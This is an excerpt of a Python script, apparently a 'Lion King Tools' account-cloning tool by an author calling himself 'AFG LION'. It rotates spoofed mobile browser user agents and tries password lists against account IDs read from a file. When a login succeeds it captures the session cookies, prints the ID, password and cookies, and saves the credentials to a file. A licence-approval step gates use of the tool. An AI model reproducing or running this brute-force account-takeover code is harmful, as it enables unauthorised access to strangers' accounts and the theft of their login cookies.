...
#------------------[ AKASH-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; TECNO KC3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9, TECNO KC3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ 91.0.4472114 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10, K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/ 557.56",]
ua = ["Mozilla/5.0 (Linux; Android 9: TECNO CC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ 92.0.4515159 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; TECNO CC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ 93.0.457752 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A145M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
...
▐▙▄▄▖▗▄█▄▖▝▚▄▞▘▐▌  ▐▌        
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY Wi-Fi & MOBILE DATA ] \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
[•] 𝐀𝐔𝐓𝐇𝐎𝐑      : 𝐀𝐅𝐆 𝐋𝐈𝐎𝐍
[•] 𝐆𝐈𝐓𝐇𝐔𝐁      : 𝐚𝐟𝐠𝐥𝐢𝐨𝐧𝟓
...
os.system('espeak -a 300 " Welcome,   to,  Lion,  King,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m===============================================')
    print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mFILE CLONE   """)
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Lion.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[𝐋𝐈𝐎𝐍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[𝐋𝐈𝐎𝐍-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[𝐋𝐈𝐎𝐍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[𝐋𝐈𝐎𝐍-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Ok,  AFG LION,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
...
def approval():
  ...
  id = "LION•AFG-"+"".join(uuid)
  os.system('clear')
  print(logo) 
  print("\033[1;37m [\u001b[36m•\033[1;37m]You Need To Aproval {Copy Key Send To Admin}\033[1;37m")
